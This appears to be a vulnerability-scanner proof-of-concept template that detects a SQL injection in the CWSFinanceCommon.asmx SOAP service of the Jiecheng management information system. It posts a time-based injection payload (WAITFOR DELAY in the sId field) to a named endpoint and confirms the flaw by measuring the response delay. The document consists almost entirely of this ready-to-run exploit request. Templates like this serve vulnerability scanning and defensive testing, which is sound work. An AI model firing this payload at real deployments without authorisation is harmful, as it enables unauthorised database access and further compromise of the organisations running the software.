id: poc-yaml-jie-cheng-management-information-system-cwsfinancecommon-asmx-sqli
info:
  name: 捷诚管理信息系统 CWSFinanceCommon.asmx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 捷诚管理信息系统
variables:
  t1: random_int(5,10)
requests:
- method: POST
  path: /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx
  headers:
    Content-Type: text/xml; charset=utf-8
  data: '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

    <soap:Body>

    <GetOSpById xmlns="http://tempuri.org/">

    <sId>1'';WAITFOR DELAY ''0:0:{{.t1}}''--+</sId>

    </GetOSpById>

    </soap:Body>

    </soap:Envelope>'
  expression: 'status_code == 200

    && contains(body,"<GetOSpByIdResult>")

    && duration > t1

    && duration <= 10

    '
transport: http
